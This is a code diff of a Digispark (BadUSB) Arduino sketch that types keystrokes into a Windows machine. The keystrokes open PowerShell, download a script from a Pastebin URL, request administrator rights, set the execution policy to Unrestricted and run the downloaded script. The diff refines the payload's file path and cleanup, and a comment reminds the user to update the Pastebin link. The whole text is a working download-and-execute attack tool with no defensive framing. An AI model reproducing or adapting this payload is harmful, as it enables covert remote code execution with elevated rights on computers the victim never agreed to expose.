@@ -24,10 +24,12 @@ void loop() {
 
   DigiKeyboard.println("powershell");
   DigiKeyboard.delay(300);
+  DigiKeyboard.println("$path = \"$env:USERPROFILE\\script2.ps1\"");
   DigiKeyboard.println("$client = new-object System.Net.WebClient");
+  DigiKeyboard.println("Remove-Item $path -ErrorAction SilentlyContinue");
   DigiKeyboard.delay(500);
-
-  DigiKeyboard.print("$client.DownloadFile(\"https://pastebin.com/raw/GaccCRrz\" , \"script.ps1\")");
+  // MAKE SURE TO UPDATE THIS PASTEBIN ACCORDING TO THE SCRIPT.PS1
+  DigiKeyboard.print("$client.DownloadFile(\"https://pastebin.com/raw/GaccCRrz\", $path)");
   DigiKeyboard.delay(1000);
 
   DigiKeyboard.println("powershell Start-Process cmd -Verb runAs");
@@ -36,8 +38,8 @@ void loop() {
   DigiKeyboard.delay(750);
   DigiKeyboard.println("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
   DigiKeyboard.delay(750);
-  
-  DigiKeyboard.print("powershell.exe -File %USERPROFILE%\\script.ps1");
+
+  DigiKeyboard.print("powershell.exe -File %USERPROFILE%\\script2.ps1");
 
   digitalWrite(1, LOW);
   for(;;){}
